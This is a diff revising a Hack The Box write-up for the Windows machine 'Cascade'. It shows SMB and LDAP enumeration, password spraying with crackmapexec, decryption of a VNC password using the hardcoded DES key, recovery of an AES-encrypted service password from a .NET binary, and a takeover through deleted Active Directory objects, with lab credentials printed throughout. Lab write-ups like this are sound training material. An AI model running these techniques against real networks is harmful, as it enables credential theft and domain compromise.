@@ -4,15 +4,19 @@
 
 ![](../.gitbook/assets/1-cascade-infocard.png)
 
-This medium difficulty Windows machine was a good refresher on themes and techniques I had seen in other machines \(such as [Nest](nest-write-up.md)\), but also gave enough of a challenge to be good practice.  With proper enumeration this should be a fairly easy challenge, depending on the comfort level with some aspects \(such as reading C\# code\).  
+This medium difficulty Windows machine was a good refresher on themes and techniques I had seen in other machines \(such as [Nest](nest-write-up.md)\), but also introduced new things and gave enough of a challenge to be quite fun. With proper enumeration this should be a fairly easy challenge, depending on the comfort level with some aspects \(such as reading C\# code\).
 
 ## Useful Skills and Tools
 
-#### Enumerate SMB shares without credentials
+### **Enumerate SMB shares without credentials**
 
-`smbclient -N -L \\<server_IP>`
+`smbclient -N -L \\\\<server_IP>\\`
 
-#### Copying an entire SMB folder recursively using smbclient:
+or
+
+`smbmap -d <domain> -L -H <IP>`
+
+### **Copying an entire SMB folder recursively using smbclient:**
 
 > 1. Connect using: `smbclient -U <user> \\\\<ip>\\<folder> <password>`
 > 2. smb: `tarmode` 
@@ -20,17 +24,35 @@ This medium difficulty Windows machine was a good refresher on themes and techni
 > 4. smb: `prompt` 
 > 5. smb: `mget <folder_to_copy>`
 
-#### Compile .NET code online
+### **Decode VNC Passwords**
+
+Many VNC products contain the same DES hardcoded encryption key for user passwords, which makes them trivial to break.
+
+```ruby
+$> msfconsole
+
+msf5 > irb
+[*] Starting IRB shell...
+[*] You are in the "framework" object
+
+>> fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07"
+>> require 'rex/proto/rfb'
+=> true
+>> Rex::Proto::RFB::Cipher.decrypt ["<encrypted_password>"].pack('H*'), fixedkey
+=> "[decoded_output]"
+```
+
+### **Compile .NET code online**
 
 To quickly compile and run any kind of .NET code on the go without having to install Visual Studio and the proper dependencies, I highly recommend the website [`https://dotnetfiddle.net/`](https://dotnetfiddle.net/)
 
-#### Disassemble .NET binaries
+### **Disassemble .NET binaries**
 
-Binaries written in .NET languages \(such as C\#\) are fairly simple to break down to the original source code with [https://github.com/icsharpcode/AvaloniaILSpy](https://github.com/icsharpcode/AvaloniaILSpy). 
+Binaries written in .NET languages \(such as C\#\) are fairly simple to break down to the original source code with [`https://github.com/icsharpcode/AvaloniaILSpy`](https://github.com/icsharpcode/AvaloniaILSpy).
 
 ## Enumeration
 
-#### Nmap scan
+#### **Nmap scan**
 
 I started my enumeration with an nmap scan of `10.10.10.182`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oN <name>` saves the output with a filename of `<name>`.
 
@@ -77,11 +99,11 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 322.04 seconds
 ```
 
-The nmap OS detection script identified this machine as `windows_server_2008:r2:sp1` which is a pretty old version of Windows!  Other than that I found the standard Windows Domain Controller ports open.
+The nmap OS detection script identified this machine as `windows_server_2008:r2:sp1` which is a pretty old version of Windows! Other than that I found the standard Windows Domain Controller ports open.
 
-#### rpcclient
+#### **rpcclient**
 
-Next, I connected to the RPC service using `rpcclient`. 
+Next, I connected to the RPC service using `rpcclient`.
 
 ```text
 rpcclient -U "" -N 10.10.10.182
@@ -104,11 +126,11 @@ user:[j.allen] rid:[0x46e]
 user:[i.croft] rid:[0x46f]
 ```
 
-I was not able to get much information, but I did get a list of usernames \(and thier RIDs\).
+I was not able to get much information, but I did get a list of usernames \(and their RIDs\).
 
-#### Metasploit - Kerberos user enumeration
+#### **Metasploit - Kerberos user enumeration**
 
-I saved the usernames to a file and ran the Metasploit module `auxiliary(gather/kerberos_enumusers)` to see which of them were valid users, and to check if any of them did not require pre-authentication.
+I saved the usernames to a file and ran the Metasploit module `auxiliary(gather/kerberos_enumusers)` to see which of them were valid users and to check if any of them did not require pre-authentication.
 
 ```text
 msf5 auxiliary(gather/kerberos_enumusers) > run
@@ -164,11 +186,11 @@ msf5 auxiliary(gather/kerberos_enumusers) > run
 [*] Auxiliary module execution completed
 ```
 
-This is interesting. Some of the accounts have had their credentials revoked and have been disabled or locked out. I hope this is not the result of someone brute-forcing a login attempt!  Unfortunately, all of the active accounts required pre-authentication.
+This was interesting. Some of the accounts had their credentials revoked and were disabled or locked out. I hoped this was not the result of someone brute-forcing a login attempt! Unfortunately, all of the active accounts required pre-authentication.
 
-#### enum4linux
+#### **enum4linux**
 
-While I was running these other commands I also had the script `enum4linux` running in another terminal.  This script automates a lot of the common enumeration tasks against a Windows machine, but can take some time to run.
+While I was running those other commands I also had the script `enum4linux` running in another terminal. This script automates a lot of the common enumeration tasks against a Windows machine, but can take some time to run.
 
 ```text
 [+] Getting builtin group memberships:
@@ -227,9 +249,9 @@ group:[Group Policy Creator Owners] rid:[0x208]
 group:[DnsUpdateProxy] rid:[0x44f]
 ```
 
-The script returned a lot of the same information I could have gotten from other sources such as `ldapsearch`, put compiled it into one location, neatly separated by category.  As useful as this tool is, I do not recommend using it as your sole source of information, as it chops out a lot of the information fields that can sometimes contain useful information.
+The script returned a lot of the same information I could have gotten from other sources such as `ldapsearch`, put compiled it into one location, neatly separated by category. As useful as this tool is, I do not recommend using it as your sole source of information, as it chops out a lot of the information fields that can sometimes contain useful information.
 
-The most useful information I got from this was the group membership for each user.  
+The most useful information I got from this was the group membership for each user.
 
 * `IT` group contains: **r.thompson**, **s.smith**, and **arksvc**.
 * `HR` group contains: **s.hickson** 
@@ -238,9 +260,9 @@ The most useful information I got from this was the group membership for each us
 * `Audit Share` group contains **s.smith**
 * `Data Share` group contains all **Domain Users**
 
-#### smbclient
+#### **smbclient**
 
-Some of the interesting groups pointed out that there was a `Data` and an `Audit` share folder.
+Some of the interesting groups insinuated that there was a `Data` and an `Audit` share folder.
 
 ```text
 zweilos@kalimaa:~/htb/cascade$ smbclient -N \\\\10.10.10.182\\Data
@@ -248,12 +270,13 @@ Anonymous login successful
 tree connect failed: NT_STATUS_ACCESS_DENIED
 ```
 
-I tried connecting to each folder anonymously to see what I could find.  I was able to login successfully, but the ACL denied me access to those folders. Odd!
+I tried connecting to each folder anonymously to see what I could find. I was able to login successfully, but the ACL denied me access to those folders. Odd!
 
+#### ldapsearch
 
-### ldapsearch
+Since I had found lots of useful information, but still had no credentials, I decided to dive deeper into LDAP and see if there were some details the other tools had missed.  \(I had even tried using the usernames list as the passwords to check for that common problem, but no dice there\).  
 
-```
+```text
 # Remote Management Users, Groups, UK, cascade.local
 dn: CN=Remote Management Users,OU=Groups,OU=UK,DC=cascade,DC=local
 objectClass: top
@@ -329,17 +352,25 @@ lastLogonTimestamp: 132375043274134331
 msDS-SupportedEncryptionTypes: 0
 cascadeLegacyPwd: clk0bjVldmE=
 ```
-Easily overlooked, there was an entry on the user `r.thompson` that seemed to have a potential password. `cascadeLegacyPwd: clk0bjVldmE=`
 
-Base64 decoding this give: `rY4n5eva`
+There were some small details that were not found in the other tools, such as the exact share folder naming.  Easily overlooked, there was also an entry on the user `r.thompson` that seemed to have a potential password in the **cascadeLegacyPwd** field .
 
-### crackmapexec 
-
+```text
+zweilos@kalimaa:~/htb/cascade$ echo clk0bjVldmE= | base64 -d
+rY4n5eva
 ```
+
+Base64 decoding `clk0bjVldmE=` gave me the password `rY4n5eva`. 
+
+#### crackmapexec
+
+I saved this password to my **passwords** file and used `crackmapexec` to test all of the users against SMB with this password.  
+
+```text
 zweilos@kalimaa:~/htb/cascade$ crackmapexec smb -u users -p passwords -d Cascade 10.10.10.182
 
 Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:CASCADE) (signing:True) (SMBv1:False)
-zweilos@kalimaa:~/htb/cascade$ crackmapexec smb -u users -p passwords -d Cascade 10.10.10.182
+
 SMB         10.10.10.182    445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:Cascade) (signing:True) (SMBv1:False)
 SMB         10.10.10.182    445    CASC-DC1         [-] Cascade\CascGuest:rY4n5eva STATUS_LOGON_FAILURE 
 SMB         10.10.10.182    445    CASC-DC1         [-] Cascade\arksvc:rY4n5eva STATUS_LOGON_FAILURE 
@@ -347,13 +378,17 @@ SMB         10.10.10.182    445    CASC-DC1         [-] Cascade\s.smith:rY4n5eva
 SMB         10.10.10.182    445    CASC-DC1         [+] Cascade\r.thompson:rY4n5eva
 ```
 
-# Initial Foothold
+As expected, the password belonged to `r.thompson`. 
 
-## Enumeration as User `r.thompson`
+## Initial Foothold
 
-### smbmap
+### Enumeration as `r.thompson`
 
-```
+#### smbmap
+
+Using my new credentials, I was able to get a full listing of the network shares on this machine.
+
+```text
 zweilos@kalimaa:~/htb/cascade$ smbmap -H 10.10.10.182 -u r.thompson -p rY4n5eva
 [+] IP: 10.10.10.182:445        Name: Casc-DC1                                          
         Disk                                                    Permissions     Comment
@@ -368,11 +403,32 @@ zweilos@kalimaa:~/htb/cascade$ smbmap -H 10.10.10.182 -u r.thompson -p rY4n5eva
         SYSVOL                                                  READ ONLY       Logon server share
 ```
 
-### smbclient
+This user was only able to access **Data**, **NETLOGON**, **print$**, and **SYSVOL**.  
 
-`r.thompson` is a member of the `IT` group so that is probably what he has access to. However, it seems to be a dead end.
+#### smbclient
 
+I checked **SYSVOL** first since it can sometimes contain passwords, but neither it nor **NETLOGON** had anything interesting.  The **print$** admin share only contained a bunch of printer drivers, and I didn't want to jump down the rabbit hole of looking for exploits there until I had exhausted all other avenues of enumeration.
+
+```text
+zweilos@kalimaa:~/htb/cascade$ smbclient -U r.thompson -W Cascade \\\\10.10.10.182\\data rY4n5eva
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Sun Jan 26 22:27:34 2020
+  ..                                  D        0  Sun Jan 26 22:27:34 2020
+  Contractors                         D        0  Sun Jan 12 20:45:11 2020
+  Finance                             D        0  Sun Jan 12 20:45:06 2020
+  IT                                  D        0  Tue Jan 28 13:04:51 2020
+  Production                          D        0  Sun Jan 12 20:45:18 2020
+  Temps                               D        0  Sun Jan 12 20:45:15 2020
+
+                13106687 blocks of size 4096. 7794950 blocks available
 ```
+
+## Road to User
+
+After connecting to the Data share, I found folders corresponding to each of the business unit security groups I had seen earlier. Since `r.thompson` is a member of the `IT` group I figured that was probably what he had access to.  \(I did check the other folders; no access\).
+
+```text
 smb: \> ls IT\
   .                                   D        0  Tue Jan 28 13:04:51 2020
   ..                                  D        0  Tue Jan 28 13:04:51 2020
@@ -393,12 +449,13 @@ getting file \IT\Logs\DCs\dcdiag.log of size 5967 as dcdiag.log (28.3 KiloBytes/
 getting file \IT\Temp\s.smith\VNC Install.reg of size 2680 as VNC Install.reg (13.8 KiloBytes/sec) (average 15.0 KiloBytes/sec)
 ```
 
-I used a little trick I leared on the machine `Nest` for downloading all of the files in an SMB folder recursively. Next I browsed through my loot.
+I used a little trick I had learned on the machine [`Nest`](nest-write-up.md) for downloading all of the files in an SMB folder recursively.  After downloading all of the files, I browsed through my loot.
 
-image here
-I found another potential username `TempAdmin` in the email file.
+![](../.gitbook/assets/2-email.png)
 
-```
+I found another potential username `TempAdmin` in the `Meeting_Notes_June_2018.html` file.  This user was given the same password as the normal admin account, so if I can find the password for one, I have the password for the other!
+
+```text
 /10/2018 15:43 [MAIN_THREAD]   ** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
 1/10/2018 15:43 [MAIN_THREAD]   Validating settings...
 1/10/2018 15:43 [MAIN_THREAD]   Error: Access is denied
@@ -417,9 +474,13 @@ I found another potential username `TempAdmin` in the email file.
 8/12/2018 12:22 [MAIN_THREAD]   Exiting with error code 0
 ```
 
-this looked interesting.  If I could login as this service I would probably have SeBackupPrivilege which would grant pretty much instant pwn. this service also has `Remote Manacement Users` group membership so it seems likely that this is a good path to look for.
+This file `ArkAdRecycleBin.log` looked interesting. If I could login as `arksvc` it seemed likely that I would probably have **SeBackupPrivilege** which would grant pretty much instant pwn. This service account also has `Remote Management Users` group membership so it seems likely that this is a good path to look for.
 
-```
+### **Finding user creds**
+
+The last file I opened was the most juicy looking. Registry keys often have interesting things in them. 
+
+```text
 zweilos@kalimaa:~/htb/cascade/IT/Temp/s.smith$ cat VNC\ Install.reg 
 ��Windows Registry Editor Version 5.00
 
@@ -464,12 +525,11 @@ zweilos@kalimaa:~/htb/cascade/IT/Temp/s.smith$ cat VNC\ Install.reg
 "VideoRects"=""
 ```
 
-As soon as I saw the VNC install .reg key I knew there would be a password in it, and I was not dissapointed.  
-https://github.com/frizb/PasswordDecrypts
+As soon as I saw the `VNC Install.reg` key I knew there had to be a password in it, and I was not disappointed.  The password was encrypted and stored in a hexadecimal format, though **`frizb`** has a repository on GitHub that describes how to decrypt this at [https://github.com/frizb/PasswordDecrypts](https://github.com/frizb/PasswordDecrypts).
 
->VNC uses a hardcoded DES key to store credentials. The same key is used across multiple product lines.
+> VNC uses a hardcoded DES key to store credentials. The same key is used across multiple product lines.
 
-```
+```ruby
 $> msfconsole
 
 msf5 > irb
@@ -484,7 +544,9 @@ irb: warn: can't alias jobs from irb_jobs.
 => "sT333ve2"
 ```
 
-```
+**`frizb`** mentions that there is an easy way to decode this using the interactive Ruby prompt in Metasploit.  Using the "industry standard" decryption key `\x17\x52\x6b\x06\x23\x4e\x58\x07` I was able to decode the password `sT333ve2`.
+
+```text
 zweilos@kalimaa:~/htb/cascade$ crackmapexec smb -u users -p passwords -d Cascade 10.10.10.182
 SMB         10.10.10.182    445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:Cascade) (signing:True) (SMBv1:False)
 SMB         10.10.10.182    445    CASC-DC1         [-] Cascade\CascGuest:rY4n5eva STATUS_LOGON_FAILURE 
@@ -495,15 +557,9 @@ SMB         10.10.10.182    445    CASC-DC1         [-] Cascade\s.smith:rY4n5eva
 SMB         10.10.10.182    445    CASC-DC1         [+] Cascade\s.smith:sT333ve2
 ```
 
-### Road to User
+### **User.txt**
 
-#### Further enumeration
-
-#### Finding user creds
-
-#### User.txt
-
-```PowerShell
+```text
 zweilos@kalimaa:~/htb/cascade$ evil-winrm -u s.smith -p sT333ve2 -i 10.10.10.182
 
 Evil-WinRM shell v2.3
@@ -549,18 +605,22 @@ SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
 ```
 
+There were ne surprises in either the groups or privileges for `s.smith`.  I was happy to find the `user.txt` file in the Desktop folder though!
+
 ```text
 *Evil-WinRM* PS C:\Users\s.smith\Desktop> type user.txt
 f29abe4e609b2aebb4fe99257a9eb507
 ```
 
-### Path to Power \(Gaining Administrator Access\)
+## Path to Power \(Gaining Administrator Access\)
 
-#### Enumeration as User `s.smith`
+### Enumeration as `s.smith`
 
-### smbmap
+#### smbmap
 
-```cmd
+Once again I fired up `smbmap` to see what level of access this user had to the **Audit$** share folder since I didn't know where it was mounted in the filesystem.  
+
+```text
 zweilos@kalimaa:~/htb/cascade$ smbmap -H 10.10.10.182 -u s.smith -p sT333ve2
 [+] IP: 10.10.10.182:445        Name: Casc-DC1                                          
         Disk                                                    Permissions     Comment
@@ -575,9 +635,9 @@ zweilos@kalimaa:~/htb/cascade$ smbmap -H 10.10.10.182 -u s.smith -p sT333ve2
         SYSVOL                                                  READ ONLY       Logon server share
 ```
 
-smith has access to the IT Data and Audit shares, as well as print$ and SYSVOL
+`s.smith` only had Read access to the **Data** and **Audit** shares, as well as **print$**, **NETLOGON**, and **SYSVOL**
 
-```cmd
+```text
 zweilos@kalimaa:~/htb/cascade$ smbclient -U s.smith -W Cascade \\\\10.10.10.182\\Audit$
 Enter CASCADE\s.smith's password: 
 Try "help" to get a list of possible commands.
@@ -596,14 +656,14 @@ smb: \> ls
                 13106687 blocks of size 4096. 7794884 blocks available
 ```
 
-the file `RunAudit.bat` only contained the line `*Evil-WinRM* PS C:\shares\audit> more RunAudit.bat CascAudit.exe "\\CASC-DC1\Audit$\DB\Audit.db"`
+Since I had already checked all of the other shares, I logged into the **audit$** share.  The first file I checked, `RunAudit.bat`, only contained one line.
 
 ```text
-*Evil-WinRM* PS C:\shares\audit> more  RunAudit.bat
+*Evil-WinRM* PS C:\shares\audit> more RunAudit.bat
 CascAudit.exe "\\CASC-DC1\Audit$\DB\Audit.db"
 ```
 
-using the command `sqlite3 Auditdb` gets me a sqlite shell where I can enumerate the database
+It looked like the executable `CascAudit.exe` runs against the database file `Audit.db` when this batch script is run. I downloaded the database file and then used the command `sqlite3 Auditdb`, which got me a SQLite shell with which I could enumerate the database.
 
 ```sql
 zweilos@kalimaa:~/htb/cascade$ sqlite3 Audit.db 
@@ -640,15 +700,25 @@ COMMIT;
 sqlite>
 ```
 
-Dumping the `Ldap` table of this database gives me the line `INSERT INTO Ldap VALUES(1,'ArkSvc','BQO5l5Kj9MdErXx6Q6AGOw==','cascade.local');` which looks like it contains a password for the ArkScv user I was hoping to move laterally into. Now I had to figure out what kind of encryption it was stored with \(not simple base64 unfortunately\)
+First I dumped the `DeletedUserAudit` table, which revealed that the user `TempAdmin` I had been looking for had been deleted! Perhaps I could find some remnants of that user which would give me his admin credentials. I dumped the `Ldap` table of this database, which gave me only a few queries including the line `INSERT INTO Ldap VALUES(1,'ArkSvc','BQO5l5Kj9MdErXx6Q6AGOw==','cascade.local');` which looked like it contained a password for the `ArkScv` user that I was hoping to move laterally into. Now I had to figure out what kind of encryption it was stored with \(it wasn't simple base64 unfortunately\).
 
-Opened `CascAudit.exe` and `CascCrypto.dll` in ILSpy; images took the decryption method from crypto.dll and the key from the exe, put the code in dotnetfiddle.net
+![](../.gitbook/assets/4-encryption-code%20%281%29.png)
 
-w3lc0meFr31nd I'm not sure what the undecipherable characters are in the output, but luckily leaving them out did not casue any issues with logging in with this password.
+Since I had noticed that  `CascAudit.exe` interacted with the database file, I was fairly certain that it had something to do with the encryption.  The file `CascCrypto.dll` in the same folder strengthened my suspicions.  I loaded each of those files in [ILSpy](https://github.com/icsharpcode/AvaloniaILSpy) hoping that they had been compiled with .NET.  Luckily for me they had, and I was presented with the source code for the files.  I very quickly spotted the line`password = Crypto.DecryptString(encryptedString, "c4scadek3y654321");` which pointed me to both the decryption method and also what was most likely a hardcoded encryption key.  
 
-### Moving Laterally to user `arksvc`
+![](../.gitbook/assets/4-casc_crypto.png)
 
-```PowerShell
+I copied the decryption method from `CascCrypto.dll` and the encryption key from the executable then loaded the code into [dotnetfiddle.net](https://dotnetfiddle.net) where I could compile and run it. 
+
+If I hadn't been comfortable with writing a tiny bit of C\# to get the code to run, all of the information needed to use other methods is contained in the code.  The encryption algorithm is AES in CBC mode with a key and block size of 128 bits, and an IV of 1tdyjCbY1lx49842.  Taking this information with the known ciphertext and encryption key, I could have used any number of programming or scripting languages, or even websites to decrypt the password \(such as one of my favorite sites for deciphering and decoding: [https://gchq.github.io/CyberChef/](https://gchq.github.io/CyberChef/)\).
+
+![](../.gitbook/assets/5-decrypted.png)
+
+After a little bit of work to make the code function as a stand-alone program, it gave me the password `w3lc0meFr31nd`.  _I'm not sure what the undecipherable characters are in the output, but luckily leaving them out did not cause any issues with logging in with this password._
+
+### Moving Laterally to `arksvc`
+
+```text
 zweilos@kalimaa:~/htb/cascade$ evil-winrm -u arksvc -p w3lc0meFr31nd -i 10.10.10.182
 
 Evil-WinRM shell v2.3
@@ -694,19 +764,19 @@ SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
 ```
 
-Darn, I expected this user to have SeBackupPrivilege. Oh well, so much for the easy win. The group `AD Recycle Bin` looked promising however. [https://blog.stealthbits.com/active-directory-object-recovery-recycle-bin/](https://blog.stealthbits.com/active-directory-object-recovery-recycle-bin/)
+Darn, I expected this user to have **SeBackupPrivilege**. Oh well, so much for the easy win. The group `AD Recycle Bin` looked promising, however. I did some research on this group and found a blog that talked about how to exploit it at [https://blog.stealthbits.com/active-directory-object-recovery-recycle-bin/](https://blog.stealthbits.com/active-directory-object-recovery-recycle-bin/).  There was also a bit of interesting trivia included that related to this machine:
 
 > The Active Directory Recycle Bin was introduced in the Windows Server 2008 R2 release.
 
-It looks like I can use this to revive the `TempAdmin` account that we saw had been deleted in the database. 
+Using the information in the blog, it looked like I could revive the `TempAdmin` account that I had seen when I enumerated the database, which had been deleted.
 
-```PowerShell
+```text
 Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects
 ```
 
 Running this command from the article returns:
 
-```PowerShell
+```text
 Deleted           : True
 DistinguishedName : CN=CASC-WS1\0ADEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe,CN=Deleted Objects,DC=cascade,DC=local
 Name              : CASC-WS1
@@ -750,7 +820,7 @@ ObjectClass       : user
 ObjectGUID        : f0cc344d-31e0-4866-bceb-a842791ca059
 ```
 
-There is the `TempAdmin` user we were looking for. We can restore it with the command`Restore-ADObject -Identity "<ObjectGUID>"`
+There is the `TempAdmin` user we were looking for. According to the blog, we can restore it with the command `Restore-ADObject -Identity "<ObjectGUID>"`. 
 
 ```text
 *Evil-WinRM* PS C:\Program Files (x86)> Restore-ADObject -Identity "f0cc344d-31e0-4866-bceb-a842791ca059"
@@ -762,9 +832,9 @@ At line:1 char:1
     + FullyQualifiedErrorId : 0,Microsoft.ActiveDirectory.Management.Commands.RestoreADObject
 ```
 
-Well that looks like a bust...what else can this user do with a deleted account? I tried trimming down the command to see how different the output was. 
+Well that looks like a bust...I wonder what else can `arksvc` do with a deleted account? I tried trimming down the command to see how different the output was.
 
-```PowerShell
+```text
 *Evil-WinRM* PS C:\Program Files (x86)> Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
 
 --snipped--
@@ -846,7 +916,7 @@ whenChanged                     : 1/27/2020 3:24:34 AM
 whenCreated                     : 1/27/2020 3:23:08 AM
 ```
 
-For a deleted account there was sure a lot of information stored!  There were a few other deleted objects, but the additional information included in the `TempAdmin` object gave me everything I needed.  There was another base64 encoded **CascLegacyPwd**.  
+For a deleted account there was sure a lot of information still stored! There were a few other deleted objects, but the additional information included in the `TempAdmin` object gave me everything I needed. There was another base64 encoded **CascLegacyPwd**.
 
 ```text
 zweilos@kalimaa:~/htb/cascade$ echo YmFDVDNyMWFOMDBkbGVz | base64 -d
@@ -855,7 +925,7 @@ baCT3r1aN00dles
 
 Decoding the base64 string `YmFDVDNyMWFOMDBkbGVz` gave me the password `baCT3r1aN00dles`.
 
-#### Getting a shell
+## **Getting an Administrator shell**
 
 ```text
 zweilos@kalimaa:~/htb/cascade$ crackmapexec winrm -u users -p passwords -d Cascade 10.10.10.182
@@ -866,9 +936,13 @@ WINRM       10.10.10.182    5985   CASC-DC1         [-] Cascade\Administrator:w3
 WINRM       10.10.10.182    5985   CASC-DC1         [+] Cascade\Administrator:baCT3r1aN00dles (Pwn3d!)
 ```
 
-Pwn3d!
+_Pwn3d!_
 
-```PowerShell
+### **Root.txt**
+
+After getting the password for `TempAdmin`, ****which I had read earlier was the same as the normal Administrator account, I was able to finally login to an Administrator shell and gather up my hard-earned loot.
+
+```text
 zweilos@kalimaa:~/htb/cascade$ evil-winrm -u Administrator -p baCT3r1aN00dles -i 10.10.10.182
 
 Evil-WinRM shell v2.3
@@ -958,9 +1032,7 @@ SeCreateSymbolicLinkPrivilege   Create symbolic links                           
 
 Woot! Domain Admin!
 
-#### Root.txt
-
-Thanks to [`Vbscrub`](https://www.hackthebox.eu/home/users/profile/158833) for &lt;something interesting or useful about this machine.
+Thanks to [`Vbscrub`](https://www.hackthebox.eu/home/users/profile/158833) for this machine which was fairly easy, but had some interesting takes on old methods and also included some things which were new to me.  Easy challenges should never be beneath you, because each one is a validation of how much you have learned!
 
 If you like this content and would like to see more, please consider supporting me through Patreon at [https://www.patreon.com/zweilosec](https://www.patreon.com/zweilosec).
 
